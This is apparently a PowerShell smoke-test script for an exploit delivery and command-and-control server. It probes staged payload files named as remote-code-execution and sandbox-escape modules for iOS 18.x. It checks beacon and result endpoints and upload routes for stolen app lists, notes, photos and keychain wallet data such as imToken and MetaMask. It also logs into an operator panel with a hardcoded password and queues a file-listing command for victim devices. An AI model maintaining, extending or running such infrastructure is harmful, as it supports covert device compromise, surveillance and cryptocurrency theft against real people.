# smoke9001.ps1 —— 管理授权版冒烟回归（对齐 Python tools/smoke9001.py 断言集，并扩展管理面覆盖）
# 用法: powershell -File tools\smoke9001.ps1 [-Base http://127.0.0.1:9001]
param([string]$Base = "http://127.0.0.1:9001")

$ErrorActionPreference = "Continue"
$script:pass = 0; $script:fail = 0

function Probe($method, $url, $body = $null, $headers = $null, [switch]$Silent4xx, [switch]$Expect401, [switch]$Expect4xx) {
    $args = @{ Uri = $url; Method = $method; WebSession = $script:sess; TimeoutSec = 10; UseBasicParsing = $true }
    if ($headers) { $args.Headers = $headers }
    if ($body -ne $null) {
        $args.Body = $body
        if (-not $headers -or -not $headers.ContainsKey("Content-Type")) { $args.ContentType = "application/json" }
    }
    try {
        $r = Invoke-WebRequest @args
        $status = [int]$r.StatusCode; $len = $r.RawContentLength
    } catch {
        $resp = $_.Exception.Response
        if ($resp) { $status = [int]$resp.StatusCode; $len = 0 } else { $status = "ERR"; $len = 0 }
    }
    $ok = ($status -eq 200) -or ($Silent4xx -and ($status -in @(403, 404))) -or ($Expect401 -and $status -eq 401) -or ($Expect4xx -and $status -ge 400 -and $status -lt 500)
    if ($ok) { $script:pass++ } else { $script:fail++ }
    $mark = if ($ok) { "OK " } else { "!! " }
    Write-Host ("{0}{1,-4} {2,-40} -> {3} {4}" -f $mark, $method, $url.Replace($Base, ""), $status, $len)
    return $status
}

$script:sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$script:sess.Headers.Add("User-Agent", "smoke-suite/1.2")

Write-Host "== 交付链 =="
$null = Probe GET "$Base/"
$null = Probe GET "$Base/index.html" $null @{ Host = "lu7266e8da57ykh.icu:9001" } -Silent4xx
$null = Probe GET "$Base/boot.html?c=1"
$null = Probe POST "$Base/api/ip-sync/sync" '{"channelCode":"1","deviceVersion":"IOS 18.6.2","domain":"lab"}'
foreach ($f in @("/B10/group.html", "/B10/rce_loader.js", "/B10/rce_worker_18.6.js",
                 "/B10/rce_module_18.6.js", "/log.html?id=0&text=smoke",
                 "/pe_worker.js", "/sbx0_main_18.4.js", "/sbx1_main.js", "/boot.js")) {
    $null = Probe GET "$Base$f"
}

Write-Host "== C2 簇 =="
$null = Probe POST "$Base/beacon" '{"uuid":"S","status":"idle"}'
$null = Probe POST "$Base/result" '{"command_id":"s","status":"ok"}'
$null = Probe POST "$Base/event" '{}'
$null = Probe POST "$Base/a" '{}'
$null = Probe POST "$Base/u" '{"lhu":"SMOKE","apps":[{"bundleId":"io.metamask","name":"MetaMask"}]}'
$null = Probe POST "$Base/nb" '{"lhu":"SMOKE","list":[{"id":1,"title":"t","snippet":"s"}]}'
$null = Probe POST "$Base/ph" "PNG" @{ "Content-Type" = "image/png" }
$null = Probe POST "$Base/war" '{"device_uuid":"SMOKE","keychain":{"wallets":{"imtoken":{"count":2,"items":[{},{},{}]}}}}'
$null = Probe GET "$Base/res/1/2" $null $null -Silent4xx
$null = Probe POST "$Base/heartbeat" "heartbeat:pe_done" @{ "Content-Type" = "text/plain" }

Write-Host "== 管理面（授权闭环）=="
$s = Probe GET "$Base/admin/"
Write-Host ("admin page         : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
$null = Probe GET "$Base/__dash" $null $null -Expect401
$null = Probe GET "$Base/__q/commands" $null $null -Expect401
$null = Probe GET "$Base/panel/api/devices" $null $null -Expect401
$s = Probe POST "$Base/__auth/login" '{"password":"lab888"}'
Write-Host ("login              : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
# ── 保留契约（Vue 控制台唯一数据源）──
$null = Probe GET "$Base/__dash/api"
$null = Probe GET "$Base/__dash/api?log_tail=10&acc_tail=5"
$null = Probe GET "$Base/__q/commands"
$null = Probe GET "$Base/__q/device_command_targets"
$null = Probe GET "$Base/__q/device_commands?target=127.0.0.1"
$null = Probe GET "$Base/panel/api/devices"
$null = Probe GET "$Base/panel/api/progress"
$null = Probe GET "$Base/panel/api/apps"
$null = Probe GET "$Base/panel/api/war"
$null = Probe GET "$Base/panel/api/notes"
$null = Probe GET "$Base/panel/api/visits"
$null = Probe GET "$Base/panel/api/keychain/devices"
$null = Probe GET "$Base/panel/api/results"
$null = Probe GET "$Base/console"
$null = Probe GET "$Base/api/stats"
$null = Probe GET "$Base/api/data/photos"
$null = Probe GET "$Base/__control"
$s = Probe POST "$Base/__control" '{"type":"ls","params":{"path":"/var/mobile"},"once":true}'
Write-Host ("arm command        : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
$s = Probe POST "$Base/beacon" '{"uuid":"S","status":"idle"}'
Write-Host ("beacon dispatch    : " + $(if ($s -eq 200) { "PASS" } else { "FAIL" }))
# ── 已下线端点应 4xx（前端全量迁移 Vue 后收敛，不再暴露）──
$null = Probe GET "$Base/panel/api/overview" $null $null -Expect4xx
$null = Probe GET "$Base/panel/api/access" $null $null -Expect4xx
$null = Probe GET "$Base/panel/api/commands" $null $null -Expect4xx
$null = Probe GET "$Base/__q/devices" $null $null -Expect4xx
$null = Probe GET "$Base/__q/stats" $null $null -Expect4xx
$null = Probe GET "$Base/__q/wallets" $null $null -Expect4xx
$null = Probe GET "$Base/api/list?type=managed" $null $null -Expect4xx
$null = Probe GET "$Base/api/activity?limit=5" $null $null -Expect4xx
$null = Probe GET "$Base/api/data/memos" $null $null -Expect4xx
$null = Probe POST "$Base/api/dispatch" '{"uuid":"SMOKE-0001","module":"basic_info"}' -Expect4xx
$null = Probe POST "$Base/__auth/logout" "{}"
$null = Probe GET "$Base/__dash/api" $null $null -Expect401

Write-Host ""
Write-Host "== 汇总: PASS=$script:pass FAIL=$script:fail =="
if ($script:fail -gt 0) { exit 1 }
